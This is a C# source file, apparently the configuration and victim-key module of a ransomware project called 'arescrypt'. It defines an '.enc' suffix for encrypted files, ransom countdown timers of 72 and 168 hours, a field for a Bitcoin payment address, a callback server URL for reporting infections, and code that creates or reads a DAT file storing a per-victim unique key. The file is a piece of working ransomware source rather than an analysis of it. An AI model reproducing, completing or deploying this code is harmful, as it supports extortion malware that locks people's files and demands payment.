namespace arescrypt
{
    class Configuration
    {
        public static string currentWorkingDirectory = System.IO.Path.GetDirectoryName(
            System.Reflection.Assembly.GetExecutingAssembly().Location);

        // Debugging configuration
        public bool sandBox = true; // Safemode for testing/debugging
        public string sandBoxDirectory = currentWorkingDirectory + @"\sandboxedDirectory";
        public bool debugMode = false; // Debug mode will enable/disable display of the Debug Console/GUI

        // Encryption/Decryption configuration
        public string encryptedFileSuffix = ".enc";

        // GUI Application configuration
        /* Timer application */
        public int lostTimer_Hours = 0xA8; public int lostTimer_Minutes = 0x0; public int lostTimer_Seconds = 0x0;
        public int riseTimer_Hours = 0x48; public int riseTimer_Minutes = 0x0; public int riseTimer_Seconds = 0x0;
        public string cryptoAddress = "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"; // insert Bitcoin/Litecoin/Zcash address here

        // DAT file configuration
        public static string datFileLocation = currentWorkingDirectory + @"\arescrypt.dat";
        // Variables to be set by GetDATFileData()
        // Server Data
        public static string callbackServer = "localhost";
        public static int callbackPort = 9000;
        public static string callbackURL = "http://" + callbackServer + "/arescrypt.php";
    }

    class UserData
    {
        public string uniqueKey { get; set; }

        public string getUniqueKey()
        {
            if (!System.IO.File.Exists(Configuration.datFileLocation))
            {
                this.uniqueKey = Cryptography.genRandomString(0xC);

                System.Console.WriteLine("No DAT file discovered, creating one now..");
                Miscellaneous.SetDATFileData(this);
                System.Console.WriteLine("DAT file created [" + Configuration.datFileLocation + "]");
            }
            else
            {
                System.Console.WriteLine("Reading dat file...");
                UserData serveJSONData = Miscellaneous.GetDATFileData();
                this.uniqueKey = serveJSONData.uniqueKey;
            }
            return this.uniqueKey;
        }
    }
}
